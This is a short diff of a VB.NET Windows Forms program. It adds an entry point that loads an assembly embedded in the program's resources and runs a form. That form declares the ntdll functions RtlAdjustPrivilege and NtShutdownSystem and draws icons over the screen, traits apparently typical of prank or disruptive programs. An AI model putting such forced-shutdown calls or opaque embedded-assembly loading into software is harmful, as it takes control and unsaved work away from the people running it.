@@ -3,6 +3,8 @@ Imports System.Drawing
 Imports System.IO
 Imports System.Media.SoundPlayer
 Imports 反色模块
+Imports System.Reflection
+
 Public Class Form2
     Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
     Public Declare Function NtShutdownSystem Lib "ntdll" (ByVal ShutdownAction As Long) As Long
@@ -217,3 +219,10 @@ again:
         www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
     End Sub
 End Class
+Module Program
+    Sub Main()
+        Assembly.Load(My.Resources.反色模块)
+        Application.EnableVisualStyles()
+        Application.Run(New Form2)
+    End Sub
+End Module
